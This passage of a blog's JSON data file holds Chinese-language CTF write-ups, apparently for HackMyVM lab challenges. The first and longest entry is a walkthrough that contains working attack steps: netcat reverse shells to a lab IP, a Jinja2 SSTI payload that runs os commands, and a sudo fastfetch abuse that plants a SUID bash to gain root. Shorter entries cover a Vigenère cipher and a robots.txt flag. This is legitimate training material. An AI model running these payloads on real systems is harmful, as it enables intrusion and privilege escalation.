'https://192.168.205.213/hacker/supercoool.php?cmd=busybox+nc+192.168.205.206+8888+-e+/bin/bash'\n```\n\u56de\u5230`nc`\u76d1\u542c\u7a97\u53e3\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888                       \nlistening on [any] 8888 ...\nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 53242\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\u6210\u529f\u62ff\u5230 `www-data` \u7684shell\uff01\n\n### 3. \u6743\u9650\u63d0\u5347 - www-data -> qaq -> root\n\n#### 3.1 www-data -> user.txt & qaq\n\n\u5148\u6765\u4e00\u5957\u7ec4\u5408\u62f3\u7a33\u5b9a\u4e00\u4e0bshell\uff1a\n```bash\nscript /dev/null -c bash\n# Ctrl+Z \nstty raw -echo; fg\n# (\u56de\u8f66)\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\u5c1d\u8bd5 `sudo -l`\uff1a\n```bash\nwww-data@eeeeeasy:/var/www/html/hacker$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for www-data: \nsudo: a password is required\n```\n\u9700\u8981\u5bc6\u7801\uff0c\u6b64\u8def\u4e0d\u901a\u3002\u53bb `/home` \u76ee\u5f55\u770b\u770b\u6709\u5565\u7528\u6237\uff1a\n```bash\nwww-data@eeeeeasy:/var/www/html/hacker$ cd /home/\nwww-data@eeeeeasy:/home$ ls -al\ntotal 16\ndrwxr-xr-x  4 root    root    4096 May 16 07:05 .\ndrwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..\ndrwxr-xr-x  3 qaq     qaq     4096 May 16 11:04 qaq\ndrwxr-xr-x  2 welcome welcome 4096 May 16 11:06 welcome\n```\n\u6709\u4e24\u4e2a\u7528\u6237 `qaq` \u548c `welcome`\u3002\u5148\u53bb `welcome` \u5bb6\u770b\u770b\u6709\u5565\u597d\u4e1c\u897f\u3002\n```bash\nwww-data@eeeeeasy:/home$ cd welcome/\nwww-data@eeeeeasy:/home/welcome$ ls -al\ntotal 32\ndrwxr-xr-x 2 welcome welcome 4096 May 16 11:06 .\ndrwxr-xr-x 4 root    root    4096 May 16 07:05 ..\n-rw------- 1 welcome welcome   13 May 16 11:06 .bash_history\n-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout\n-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc\n-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile\n-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo\n-rw-r--r-- 1 root    root      44 May 16 11:02 user.txt # <--- user flag!\nwww-data@eeeeeasy:/home/welcome$ cat user.txt \nflag{user-376760a7c735a606d4f8d8340bad4184}\n```\n\u76f4\u63a5\u62ff\u5230\u4e86 `user.txt`\uff01\u770b\u6765\u6743\u9650\u8bbe\u7f6e\u6709\u70b9\u677e\u3002\n\n\u63a5\u4e0b\u6765\u770b\u770b\u80fd\u4e0d\u80fd\u63d0\u5230 `qaq` \u6216\u8005 `root`\u3002\n\u68c0\u67e5SUID\u6587\u4ef6\u548c\u5b9a\u65f6\u4efb\u52a1\uff1a\n```bash\nwww-data@eeeeeasy:/home/welcome$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\nwww-data@eeeeeasy:/home/welcome$ crontab -l\nno crontab for www-data\n```\nSUID\u6587\u4ef6\u6ca1\u5565\u7279\u522b\u7684\uff0c\u5b9a\u65f6\u4efb\u52a1\u4e5f\u6ca1\u6709\u3002\n\u53bb `/opt/` \u76ee\u5f55\u7785\u7785\uff1a\n```bash\nwww-data@eeeeeasy:/tmp$ cd /opt/\nwww-data@eeeeeasy:/opt$ ls -al\ntotal 12\ndrwxr-xr-x  3 root root 4096 May 16 10:07 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\ndrwxr-x---  4 qaq  qaq  4096 May 16 11:00 flask-app # <--- \u5f52\u5c5e\u4e8eqaq\u7528\u6237\n```\n\u53d1\u73b0\u4e00\u4e2a `/opt/flask-app` \u76ee\u5f55\uff0c\u5c5e\u4e8e `qaq` \u7528\u6237\u3002\u770b\u770b\u8fdb\u7a0b\u91cc\u6709\u6ca1\u6709\u76f8\u5173\u7684\u3002\n```bash\nwww-data@eeeeeasy:/opt$ ps aux | grep 'flask'\nqaq          555  0.0  1.3  35132 27836 ?        S    04:39   0:00 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py\nqaq          556  0.1  1.3 182880 28364 ?        Sl   04:39   0:01 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py\nwww-data     773  0.0  0.0   3176   696 pts/0    S+   05:04   0:00 grep flask\n```\n\u679c\u7136\uff0c`qaq` \u7528\u6237\u6b63\u5728\u8fd0\u884c `/opt/flask-app/app.py`\u3002\u770b\u770b\u5b83\u76d1\u542c\u4e86\u4ec0\u4e48\u7aef\u53e3\u3002\n```bash\nwww-data@eeeeeasy:/opt$ ss -tulnp\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128            127.0.0.1:5000          0.0.0.0:*  # <--- Flask App\ntcp     LISTEN   0        128                 [::]:22               [::]:*      \ntcp     LISTEN   0        128                    *:443                 *:*      \ntcp     LISTEN   0        128                    *:80                  *:*     \n```\n\u8fd9\u4e2aFlask\u5e94\u7528\u76d1\u542c\u5728 `127.0.0.1:5000`\u3002\u7528`curl`\u8bbf\u95ee\u4e00\u4e0b\u3002\n```bash\nwww-data@eeeeeasy:/opt$ curl 127.0.0.1:5000\n\n    <html>\n        <head><title>SurveyMaster - \u586b\u5199\u95ee\u5377</title>\n<style>\n    /* ... CSS styles ... */\n</style>\n</head>\n        <body>\n            <div class='container'>\n                <h1>SurveyMaster</h1>\n                <p>\u63d0\u4ea4\u4f60\u7684\u95ee\u5377\uff0c\u5206\u4eab\u4f60\u7684\u60f3\u6cd5\uff01</p>\n                <form action='/submit' method='POST'>\n                    <input type='text' name='username' placeholder='\u4f60\u7684\u540d\u5b57' required>\n                    <input type='text' name='question' placeholder='\u95ee\u5377\u95ee\u9898' required>\n                    <textarea name='answer' placeholder='\u4f60\u7684\u7b54\u6848' required></textarea>\n                    <input type='submit' value='\u63d0\u4ea4\u95ee\u5377'>\n                </form>\n            </div>\n        </body>\n    </html>\n```\n\u662f\u4e2a\u95ee\u5377\u63d0\u4ea4\u9875\u9762\u3002Flask\u5e94\u7528\uff0c\u5e38\u7528\u7684\u6a21\u677f\u5f15\u64ce\u662fJinja2\uff0c\u8fd9\u5c31\u6709SSTI\u7684\u53ef\u80fd\u4e86\u3002\n\u5c1d\u8bd5\u5728POST\u8bf7\u6c42\u7684\u5404\u4e2a\u53c2\u6570 (`username`, `question`, `answer`) \u4e2d\u63d2\u5165 `{{7*7}}` \u6765\u6d4b\u8bd5SSTI\u3002\n\n```bash\nwww-data@eeeeeasy:/opt$ sh # \u5207\u6362\u5230sh\u65b9\u4fbf\u591a\u6b21\u6267\u884ccurl\n$ curl -X POST -d 'username={{7*7}}&question=test&answer=test' http://127.0.0.1:5000/submit\n# ... (\u8f93\u51fa\u663e\u793a\u7528\u6237\u540d\u4e3a {{7*7}}\uff0c\u6ca1\u6709 SSTI) ...\n$ curl -X POST -d 'username=test&question={{7*7}}&answer=test' http://127.0.0.1:5000/submit\n# ... (\u8f93\u51fa\u663e\u793a\u95ee\u9898\u4e3a {{7*7}}\uff0c\u6ca1\u6709 SSTI) ...\n$ curl -X POST -d 'username=test&question=test&answer={{7*7}}' http://127.0.0.1:5000/submit\n\n        <html>\n            <head><title>SurveyMaster - \u95ee\u5377\u63d0\u4ea4</title>\n            <!-- ... CSS ... -->\n            </head>\n            <body>\n                <div class='container'>\n                    <h1>\u95ee\u5377\u63d0\u4ea4\u6210\u529f</h1>\n                    <p>\u63d0\u4ea4\u8005: test</p>\n                    <p>\u95ee\u9898: test</p>\n                    <p>\u7b54\u6848: 49</p>  <!-- bingo\uff01 -->\n                    <p><a href='/preview/test'>\u67e5\u770b\u4f60\u7684\u95ee\u5377</a> | <a href='/'>\u7ee7\u7eed\u586b\u5199</a></p>\n                </div>\n            </body>\n        </html>\n```\n\u6f02\u4eae\uff01\u5f53`answer`\u5b57\u6bb5\u7684\u503c\u662f `{{7*7}}` \u65f6\uff0c\u8fd4\u56de\u7684\u9875\u9762\u4e2d\u7b54\u6848\u663e\u793a\u4e3a `49`\u3002\u8fd9\u660e\u786e\u5730\u8bc1\u660e\u4e86 `answer` \u5b57\u6bb5\u5b58\u5728SSTI\u6f0f\u6d1e\uff01\n\n\u6784\u9020SSTI payload\u6765\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u53d6`qaq`\u7528\u6237\u7684\u6743\u9650\u3002\n```bash\n$ curl -X POST -d 'username=test&question=test&answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}' http://127.0.0.1:5000/submit\n\n        <html>\n            <!-- ... HTML structure ... -->\n            <body>\n                <div class='container'>\n                    <h1>\u95ee\u5377\u63d0\u4ea4\u6210\u529f</h1>\n                    <p>\u63d0\u4ea4\u8005: test</p>\n                    <p>\u95ee\u9898: test</p>\n                    <p>\u7b54\u6848: uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)  # <--- \u547d\u4ee4\u6267\u884c\u6210\u529f\uff01\n</p>\n                    <p><a href='/preview/test'>\u67e5\u770b\u4f60\u7684\u95ee\u5377</a> | <a href='/'>\u7ee7\u7eed\u586b\u5199</a></p>\n                </div>\n            </body>\n        </html>\n```\n\u6210\u529f\u4ee5`qaq`\u7528\u6237\u8eab\u4efd\u6267\u884c\u4e86`id`\u547d\u4ee4\u3002\u73b0\u5728\uff0c\u5f39\u4e2a`qaq`\u7528\u6237\u7684shell\u56de\u6765\u3002\n\nKali\u4e0a\u518d\u6b21\u76d1\u542c\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\n```\n\u901a\u8fc7SSTI\u53d1\u9001\u53cd\u5f39shell payload\uff1a\n```bash\n$ curl -X POST -d 'username=test&question=test&answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.206 8888 -e /bin/bash').read() }}' http://127.0.0.1:5000/submit\n```\n\u56de\u5230Kali\u7684`nc`\u76d1\u542c\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 42084\nid\nuid=1001(qaq) gid=1001(qaq) groups=1001(qaq)\n```\n\u6210\u529f\u62ff\u5230 `qaq` \u7528\u6237\u7684shell\uff01\n\n#### 3.2 qaq -> root\n\n\u518d\u6b21\u7a33\u5b9ashell\uff1a\n```bash\nscript /dev/null -c bash\n# Ctrl+Z\nstty raw -echo; fg\n# (press enter)\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\u73b0\u5728\u662f `qaq` \u7528\u6237\u4e86\uff0c\u770b\u770b\u6709\u4ec0\u4e48`sudo`\u6743\u9650\u6216\u8005SUID\u7a0b\u5e8f\u53ef\u4ee5\u5229\u7528\u3002\n```\nqaq@eeeeeasy:~$ sudo -l\nMatching Defaults entries for qaq on eeeeeasy:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser qaq may run the following commands on eeeeeasy:\n    (ALL) NOPASSWD: /usr/bin/fastfetch\n```\n\n\u8fd9\u91cc\u6211\u4eec\u53d1\u73b0 `/usr/bin/fastfetch` \u8fd9\u4e2a\u7a0b\u5e8f\u6709\u70b9\u7279\u6b8a\u3002\u6211\u4eec\u53ef\u4ee5\u7528 `sudo` \u6267\u884c\u5b83\n\u5148\u770b\u770b `fastfetch -h` \u6709\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u5229\u7528\u7684\u53c2\u6570\uff1a\n\n```bash\nqaq@eeeeeasy:~$ sudo /usr/bin/fastfetch -h\nFastfetch is a neofetch-like tool for fetching system information and displaying them in a pretty way\n\nUsage: fastfetch <?options>\n# ... (\u5927\u91cf\u5e2e\u52a9\u4fe1\u606f\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u80fd\u6267\u884c\u547d\u4ee4\u7684) ...\nModule specific options:\n      --command-shell <str>                  Set the shell program to execute the command text\n      --command-key <str>                    Set the module key to display\n      --command-text <str>                   Set the command text to be executed # <--- \u8fd9\u4e2a\u770b\u8d77\u6765\u5f88\u5371\u9669\uff01\n# ... (\u66f4\u591a\u5e2e\u52a9\u4fe1\u606f) ...\n```\n\u4ece\u5e2e\u52a9\u4fe1\u606f\u4e2d\uff0c`--command-text <str>` \u8fd9\u4e2a\u9009\u9879\u5141\u8bb8\u6211\u4eec\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u914d\u5408 `--structure 'command'` \u5c31\u53ef\u4ee5\u7528 `fastfetch` \u6765\u6267\u884c\u6211\u4eec\u60f3\u6267\u884c\u7684\u547d\u4ee4\u4e86\uff0c\u5e76\u4e14\u662f\u4ee5`sudo`\uff08\u5373root\uff09\u6743\u9650\u6267\u884c\uff01\n\n(\u4e3a\u4ec0\u4e48\u4e00\u5b9a\u8981\u52a0\u4e0a`structure`\uff0c\u56e0\u4e3a\u8981\u4f7f\u7528\u5b83\u544a\u8bc9`fastfetch`\u52a0\u8f7d`command`)\n\n\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u6211\u4eec\u8ba9`fastfetch`\u590d\u5236 `/bin/bash` \u5230 `/tmp/sh`\uff0c\u5e76\u7ed9 `/tmp/sh` \u52a0\u4e0aSUID\u6743\u9650\u4f4d\u3002\n```bash\nqaq@eeeeeasy:~$ sudo /usr/bin/fastfetch --structure 'command' --command-text 'cp /bin/bash /tmp/sh && chmod +s /tmp/sh'\n       _,met$$$$$gg.\n    ,g$$$$$$$$$$$$$$$P.\n  ,g$$P'         '''Y$$.'.\n ,$$P'               `$$$.\n',$$P       ,ggs.     `$$b:\n`d$$'     ,$P''   .    $$$\n $$P      d$'     ,    $$$P\n $$:      $.   -    ,d$$'\n $$;      Y$b._   _,d$P'\n Y$$.    `.`'Y$$$$P''\n `$$b      '-.__\n  `Y$$\n   `Y$$.\n     `$$b.\n       `Y$$b.\n          `'Y$b._\n             `'''\n```\n\u68c0\u67e5\u4e00\u4e0b `/tmp/sh` \u7684\u6743\u9650\uff1a\n```bash\nqaq@eeeeeasy:~$ ls -la /tmp/\ntotal 1184\ndrwxrwxrwt 10 root root    4096 May 17 05:14 .\ndrwxr-xr-x 18 root root    4096 Mar 18 20:37 ..\ndrwxrwxrwt  2 root root    4096 May 17 04:38 .font-unix\ndrwxrwxrwt  2 root root    4096 May 17 04:38 .ICE-unix\n-rwsr-sr-x  1 root root 1168776 May 17 05:13 sh # <--- SUID\u4f4d\u5df2\u8bbe\u7f6e\uff0c\u6240\u6709\u8005\u662froot\ndrwx------  3 root root    4096 May 17 04:38 systemd-private-136e6172f431486383a8b142a9e39960-apache2.service-3yeZai\n# ...\n```\n\u53ef\u4ee5\u770b\u5230 `/tmp/sh` \u5df2\u7ecf\u662f `root` \u7528\u6237\u6240\u6709\uff0c\u5e76\u4e14\u8bbe\u7f6e\u4e86SUID\u548cSGID\u4f4d\u3002\n\u73b0\u5728\u76f4\u63a5\u6267\u884c `/tmp/sh -p` \u6765\u83b7\u53d6root\u6743\u9650\u7684shell (`-p` \u53c2\u6570\u4f7f\u5f97bash\u4e0d\u4f1a\u56e0\u4e3aeuid\u4e0d\u540c\u800c\u653e\u5f03\u7279\u6743)\u3002\n\n```bash\nqaq@eeeeeasy:~$ /tmp/sh -p\nsh-5.0# id\nuid=1001(qaq) gid=1001(qaq) euid=0(root) egid=0(root) groups=0(root),1001(qaq)\n```\nBoom! `euid=0(root)`\uff0c\u6210\u529f\u62ff\u5230root\u6743\u9650\uff01\n\n\u6700\u540e\u4e00\u6b65\uff0c\u8bfb\u53d6root flag\uff1a\n```bash\nsh-5.0# cat /root/root.txt \nflag{root-818a8bc5d566d7c856f14eec2791cd78}\n```\n\n\u6536\u5de5\uff01\u6253\u5b8c\u6536flag\uff0c\u7f8e\u6ecb\u6ecb\uff01\n\nsentence", "top": 0, "createdAt": 1751016605, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P46": {"htmlDir": "docs/post/Challenge 013.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 013", "postUrl": "post/Challenge%20013.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/46", "commentNum": 0, "wordCount": 1409, "description": "**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=013\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518140039064.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\uff0c\u9875\u9762\u4e0a\u663e\u793a\u4e86\u4e00\u6bb5\u88ab `<pre>` \u6807\u7b7e\u5305\u88f9\u7684\u6587\u672c\uff1a\n\n```html\n<pre> MXV{BNRNKWPCEUSEX} k:FLAG </pre>\n```\n\n\u8fd9\u6bb5\u6587\u672c\u5305\u542b\u4e24\u90e8\u5206\uff1a\n1.  `MXV{BNRNKWPCEUSEX}`: \u8fd9\u770b\u8d77\u6765\u662f\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684 Flag \u683c\u5f0f\uff0c\u5176\u4e2d `MXV` \u53ef\u80fd\u662f\u52a0\u5bc6\u6587\u672c\u7684\u524d\u7f00\uff0c`BNRNKWPCEUSEX` \u662f\u5bc6\u6587\u3002\n2.  `k:FLAG`: \u8fd9\u5f3a\u70c8\u6697\u793a\u4e86\u52a0\u5bc6\u6240\u4f7f\u7528\u7684\u5bc6\u94a5 (key) \u662f\u5b57\u7b26\u4e32 'FLAG'\u3002\n\n\u7ed3\u5408\u5e38\u89c1\u7684 CTF \u9898\u76ee\u7c7b\u578b\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u5bc6\u6587\u548c\u5bc6\u94a5\u63d0\u793a\u901a\u5e38\u6307\u5411\u53e4\u5178\u5bc6\u7801\uff0c\u5982\u51ef\u6492\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49\u3002\u8003\u8651\u5230\u63d0\u4f9b\u4e86\u591a\u5b57\u7b26\u5bc6\u94a5 'FLAG'\uff0c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 (Vigen\u00e8re cipher) \u662f\u6700\u6709\u53ef\u80fd\u7684\u52a0\u5bc6\u65b9\u5f0f\u3002\n\n## 2. \u89e3\u5bc6\u8fc7\u7a0b\n\n\u4e3a\u4e86\u83b7\u53d6\u539f\u59cb Flag\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u8bc6\u522b\u51fa\u7684\u5bc6\u94a5\u5bf9\u5bc6\u6587\u8fdb\u884c\u7ef4\u5409\u5c3c\u4e9a\u89e3\u5bc6\u3002\n\n### 2.1 \u8bc6\u522b\u52a0\u5bc6\u7c7b\u578b\u53ca\u5bc6\u94a5\n\n*   **\u52a0\u5bc6\u7c7b\u578b**: \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 (Vigen\u00e8re cipher)\u3002\n*   **\u5bc6\u6587**: `BNRNKWPCEUSEX` (\u53d6\u81ea `MXV{BNRNKWPCEUSEX}` \u4e2d\u7684\u82b1\u62ec\u53f7\u90e8\u5206)\u3002\n*   **\u5bc6\u94a5**: `FLAG` (\u6839\u636e\u9875\u9762\u63d0\u793a `k:FLAG`)\u3002\n\n### 2.2 \u4f7f\u7528 CyberChef \u8fdb\u884c\u89e3\u5bc6\n\nCyberChef \u662f\u4e00\u4e2a\u975e\u5e38\u65b9\u4fbf\u7684\u5728\u7ebf\u7f16\u89e3\u7801\u5de5\u5177\uff0c\u975e\u5e38\u9002\u5408\u5904\u7406\u6b64\u7c7b\u53e4\u5178\u5bc6\u7801\u3002\n\n1.  \u6253\u5f00 CyberChef\u3002\n2.  \u5c06\u5bc6\u6587 `BNRNKWPCEUSEX` \u7c98\u8d34\u5230 'Input' \u6846\u4e2d\u3002\n    *   \u6216\u8005\uff0c\u53ef\u4ee5\u5c06\u5b8c\u6574\u7684\u5b57\u7b26\u4e32 `MXV{BNRNKWPCEUSEX}` \u8f93\u5165\uff0c\u7136\u540e\u89c2\u5bdf\u89e3\u5bc6\u7ed3\u679c\u662f\u5426\u5305\u542b\u53ef\u8bc6\u522b\u7684 Flag \u683c\u5f0f\u3002\u6839\u636e\u60a8\u7684\u622a\u56fe\uff0c\u60a8\u8f93\u5165\u7684\u662f\u5b8c\u6574\u7684 `MXV{BNRNKWPCEUSEX}`\u3002\n3.  \u5728 'Operations' \u5217\u8868\u4e2d\u641c\u7d22 'Vigen\u00e8re Decode' \u5e76\u5c06\u5176\u62d6\u62fd\u5230 'Recipe' \u533a\u57df\u3002\n4.  \u5728 'Vigen\u00e8re Decode' \u64cd\u4f5c\u7684 'Key' \u5b57\u6bb5\u4e2d\u8f93\u5165\u5bc6\u94a5 `FLAG`\u3002\n\nCyberChef \u7684\u64cd\u4f5c\u754c\u9762\u548c\u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b\u6240\u793a\uff1a\n\n![1](https://7r1umphk.github.io/image/20250702100248579.webp)\n\n\u4ece CyberChef \u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u8f93\u5165\u4e3a `MXV{BNRNKWPCEUSEX}` \u4e14\u5bc6\u94a5\u4e3a `FLAG` \u65f6\uff0c\u89e3\u5bc6\u7ed3\u679c\u662f `HMV{VIGNERECYPHER}`\u3002\n\u8fd9\u610f\u5473\u7740\u539f\u59cb Flag \u7684\u524d\u7f00\u662f `HMV`\uff0c\u5185\u5bb9\u662f `VIGNERECYPHER`\u3002\n\n## 3. \u83b7\u53d6 Flag \u5185\u5bb9\n\n\u901a\u8fc7 CyberChef \u4f7f\u7528\u7ef4\u5409\u5c3c\u4e9a\u89e3\u5bc6\uff0c\u6211\u4eec\u6210\u529f\u5730\u5c06\u5bc6\u6587 `MXV{BNRNKWPCEUSEX}` \u914d\u5408\u5bc6\u94a5 `FLAG` \u89e3\u5bc6\u4e3a\u660e\u6587\u3002\n\n## 4. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n\n```\nHMV{VIGNERECYPHER}\n```\n\n---sentence", "top": 0, "createdAt": 1751016607, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P47": {"htmlDir": "docs/post/Challenge 014.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 014", "postUrl": "post/Challenge%20014.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/47", "commentNum": 0, "wordCount": 845, "description": "# 1. \u521d\u6b65\u5206\u6790\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=014\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io//20250518140930918.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u6311\u6218\u9875\u9762\u975e\u5e38\u76f4\u63a5\u5730\u7ed9\u51fa\u4e86\u4efb\u52a1\uff1a\n\n```\nFind the flag in the domain http://momo.hackmyvm.eu\n```\n\n\u8fd9\u8868\u660e Flag \u9690\u85cf\u5728\u76ee\u6807\u57df\u540d `http://momo.hackmyvm.eu` \u7684\u67d0\u4e2a\u4f4d\u7f6e\u3002\u5bf9\u4e8e Web \u7c7b\u578b\u7684\u6311\u6218\uff0c\u5e38\u89c1\u7684 Flag \u9690\u85cf\u5730\u70b9\u5305\u62ec\uff1a\n*   HTML \u6e90\u4ee3\u7801\u6ce8\u91ca\n*   \u7279\u5b9a\u7684\u9875\u9762\u6216\u6587\u4ef6\u8def\u5f84\n*   HTTP \u54cd\u5e94\u5934\n*   `robots.txt` \u6587\u4ef6\n*   `.htaccess` \u6216\u5176\u4ed6\u670d\u52a1\u5668\u914d\u7f6e\u6587\u4ef6\uff08\u5982\u679c\u53ef\u8bbf\u95ee\uff09\n*   \u76ee\u5f55\u7206\u7834\u53d1\u73b0\u7684\u9690\u85cf\u76ee\u5f55\u6216\u6587\u4ef6\n\n## 2. \u5bfb\u627e Flag\n\n\u6839\u636e Web \u5b89\u5168\u6d4b\u8bd5\u7684\u5e38\u89c1\u6b65\u9aa4\uff0c\u9996\u5148\u68c0\u67e5 `robots.txt` \u6587\u4ef6\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u8d77\u70b9\uff0c\u56e0\u4e3a\u5b83\u901a\u5e38\u4f1a\u6307\u793a\u641c\u7d22\u5f15\u64ce\u54ea\u4e9b\u8def\u5f84\u4e0d\u5e94\u8be5\u88ab\u7d22\u5f15\uff0c\u6709\u65f6\u4f1a\u610f\u5916\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u6216\u7ebf\u7d22\u3002\n\n### 2.1 \u68c0\u67e5 robots.txt\n\n\u4f7f\u7528 `curl` \u547d\u4ee4\uff08\u6216\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\uff09\u6765\u83b7\u53d6 `http://momo.hackmyvm.eu/robots.txt` \u7684\u5185\u5bb9\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://momo.hackmyvm.eu/robots.txt\nHMV{robotized}\n```\n\n## 3. \u83b7\u53d6 Flag \u5185\u5bb9\n\n`curl` \u547d\u4ee4\u7684\u8f93\u51fa\u76f4\u63a5\u8fd4\u56de\u4e86 Flag\u3002`robots.txt` \u6587\u4ef6\u4e2d\u5305\u542b\u4e86 `HMV{robotized}`\u3002\n\n## 4. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n\n```\nHMV{robotized}\n```\nsentence", "top": 0, "createdAt": 1751016610, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P48": {"htmlDir": "docs/post/Challenge 036.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 036", "postUrl": "post/Challenge%20036.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/48", "commentNum": 0, "wordCount": 3180, "description": "![image-20250614100556180](https://7r1umphk.github.io/image/20250614100556493.webp)\n\n\u627eBSSID\uff0c\u5148\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 036.zip                                   \n-rwxr-xr-x 1 kali kali 1495216 Jun 13 22:06 036.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 036.zip \nArchive:  036.zip\n extracting: 036.png                 \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ exiftool 036.png \nExifTool Version Number         : 13.25\nFile Name                       : 036.png\nDirectory                       : .\nFile Size                       : 1495 kB\nFile Modification Date/Time     : 2023:08:24 12:20:50-04:00\nFile Access Date/Time           : 2025:06:13 22:06:26-04:00\nFile Inode Change Date/Time     : 2023:08:24 12:20:50-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 1153\nImage Height                    : 721\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nSRGB Rendering                  : Perceptual\nGamma                           : 2.2\nPixels Per Unit X               : 3779\nPixels Per Unit Y               : 3779\nPixel Units                     : meters\nSoftware                        : Greenshot\nImage Size                      : 1153x721\nMegapixels                      : 0.831\n                